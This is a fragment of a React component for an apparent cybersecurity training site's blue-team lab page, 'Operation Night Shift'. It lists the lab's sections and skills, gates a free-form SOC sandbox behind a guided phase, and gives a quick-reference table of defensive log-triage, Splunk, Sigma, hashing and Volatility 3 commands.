        <div style={{ fontSize: '7px', color: '#1a4a50', letterSpacing: '0.25em', marginBottom: '10px' }}>LAB SECTIONS ({steps.length} STEPS &#183; {xpTotal} XP)</div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(min(260px, 100%), 1fr))', gap: '6px' }}>
          {[
            { section: '01–03', title: 'Alert Triage on the Linux Bastion', steps: '3 steps' },
            { section: '04–05', title: 'Pivot to Active Directory (SPL)', steps: '2 steps' },
            { section: '06–09', title: 'Patient Zero, ATT&CK & Payload Decoding', steps: '4 steps' },
            { section: '10–13', title: 'DNS, Sysmon, Persistence & Sigma', steps: '4 steps' },
            { section: '14–16', title: 'Containment, Hashing & Threat Intel', steps: '3 steps' },
            { section: '17–20', title: 'Timeline, Memory Forensics & Report', steps: '4 steps' },
          ].map(s => (
            <div key={s.section} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start' }}>
              <span style={{ fontSize: '7px', color: accent + '66', flexShrink: 0, minWidth: '30px' }}>{s.section}</span>
              <div>
                <div style={{ fontSize: '7.5px', color: '#4a8a90' }}>{s.title}</div>
                <div style={{ fontSize: '6.5px', color: '#2a5a60', marginTop: '1px' }}>{s.steps}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* ── PHASE 1: Guided Learning ── */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(77,208,225,0.1)', border: '1px solid rgba(77,208,225,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#2a5a60', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Operation Night Shift</h1>
          </div>
        </div>

        <p style={{ color: '#6a8a8c', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          {steps.length} steps through one realistic intrusion, from the first SIEM alert to the incident report: log triage on a Linux bastion,
          Splunk queries over Windows events, decoding an encoded PowerShell payload, DNS and Sysmon pivots, writing a Sigma rule,
          containment, threat intel enrichment, timeline building and Volatility 3 memory forensics. Every domain and IP is fictional or reserved.
        </p>

        <div style={{ background: 'rgba(77,208,225,0.03)', border: '1px solid rgba(77,208,225,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#1a4a50', letterSpacing: '0.25em', marginBottom: '8px' }}>SKILLS DEVELOPED</div>
          <div style={{ display: 'flex', flexWrap: 'wrap' as const, gap: '6px' }}>
            {[
              'Linux auth.log triage',
              'Stacking with sort | uniq -c',
              'Splunk SPL aggregation',
              'Password spray recognition',
              'Windows 4625 / 4624 / 4688 / 7045',
              'ATT&CK mapping',
              'Encoded PowerShell decoding',
              'Zeek DNS analysis',
              'Beacon identification',
              'Sysmon Event ID 3',
              'Sigma rule modifiers',
              'EDR host isolation',
              'Evidence hashing',
              'MISP / threat intel pivoting',
              'Timeline construction',
              'Volatility 3 pslist & netscan',
              'Incident reporting',
            ].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#3a7a80', background: 'rgba(77,208,225,0.06)', border: '1px solid rgba(77,208,225,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="blue-team-lab"
          moduleId={moduleId}
          title="Operation Night Shift"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
          onRestart={() => { setGuidedDone(false); setFreeLaunched(false); setEarnedXp(0) }}
        />
      </div>

      {/* ── PHASE 2: Free Lab ── */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(77,208,225,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(77,208,225,0.4)' : '#16343a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#2a5a60', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#4a8a90' : '#2a5a60', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#2a5a60' }}>SOC Analyst Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(77,208,225,0.04)' : '#020607', border: '1px solid ' + (guidedDone ? 'rgba(77,208,225,0.25)' : '#0a1a1c'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && (
              <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />
            )}
            <div style={{ fontSize: '7px', color: guidedDone ? '#3a7a80' : '#16343a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#2a5a60', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#4a7a80', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox — no guided prompts, no restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap' as const, marginBottom: '2rem' }}>
              {[
                'Log triage with grep / awk / sort',
                'SIEM query practice',
                'Base64 & payload decoding',
                'Evidence hashing',
                'Volatility 3 plugins',
                'Timeline building',
              ].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#16343a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#4a8a90' : '#16343a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{
                fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em',
                padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(77,208,225,0.6)' : '#16343a'),
                borderRadius: '6px', background: guidedDone ? 'rgba(77,208,225,0.12)' : 'transparent',
                color: guidedDone ? accent : '#16343a', cursor: guidedDone ? 'pointer' : 'not-allowed',
                boxShadow: guidedDone ? '0 0 24px rgba(77,208,225,0.18)' : 'none', transition: 'all 0.2s',
              }}
            >
              {guidedDone ? '▸ LAUNCH FREE LAB ENVIRONMENT' : 'COMPLETE THE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && (
              <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#16343a' }}>
                Complete all {steps.length} guided steps above to unlock the free lab environment
              </div>
            )}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#020708' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#030a0b', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a7a80' }}>
                Free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) to generate new alerts to triage or to explain any detection or forensic technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button
          onClick={() => setShowKeywords(!showKeywords)}
          style={{ background: 'transparent', border: '1px solid #16343a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a6a70', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0, transition: 'all 0.15s' }}
        >
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — SOC & IR COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#030a0b', border: '1px solid #0d1f22', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(min(340px, 100%), 1fr))', gap: '8px' }}>
              {[
                ['grep "Failed password" /var/log/auth.log', 'Failed SSH logins (Debian/Ubuntu)'],
                ['journalctl -u ssh --since today', 'SSH logs on journald-only systems'],
                ['sort ips.txt | uniq -c | sort -nr', 'Stack values, most frequent first'],
                ['index=wineventlog EventCode=4625 | stats count by TargetUserName', 'SPL: failed logons per account'],
                ['| stats dc(TargetUserName) by IpAddress', 'SPL: spray detection (distinct users per source)'],
                ['index=sysmon EventCode=3 DestinationIp=X', 'SPL: which process connected to X'],
                ['base64 -d f | iconv -f utf-16le -t utf-8', 'Decode PowerShell -EncodedCommand'],
                ['zeek-cut -d ts id.orig_h query < dns.log', 'Zeek DNS with readable timestamps'],
                ['sigma convert -t splunk -p sysmon rule.yml', 'Convert a Sigma rule to SPL'],
                ['sha256sum file', 'Hash evidence'],
                ['sort -t, -k1,1 timeline.csv', 'Sort a CSV timeline by timestamp'],
                ['vol -f mem.raw windows.info', 'Volatility 3: identify the image'],
                ['vol -f mem.raw windows.pslist', 'Volatility 3: process list'],
                ['vol -f mem.raw windows.pstree', 'Volatility 3: parent-child tree'],
                ['vol -f mem.raw windows.cmdline', 'Volatility 3: command lines'],
                ['vol -f mem.raw windows.netscan', 'Volatility 3: network connections'],
                ['vol -f mem.raw windows.malfind --pid N', 'Volatility 3: injected code'],
                ['4624 / 4625 / 4688 / 4720 / 7045 / 1102', 'Logon ok / failed / process / new user / service / log cleared'],
                ['4768 / 4769', 'Kerberos TGT / service ticket (watch RC4 0x17)'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#020607', borderRadius: '4px', flexWrap: 'wrap' as const }}>
                  <code style={{ color: accent, fontSize: '0.7rem', wordBreak: 'break-all' as const }}>{cmd}</code>
                  <span style={{ color: '#4a7a80', fontSize: '0.68rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #0d1f22', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap' as const, gap: '10px' }}>
        <Link href="/modules/blue-team" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a70' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/mobile-security/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a70' }}>&#8592; MOD-13 MOBILE SECURITY LAB</Link>
      </div>
    </div>
  )
}
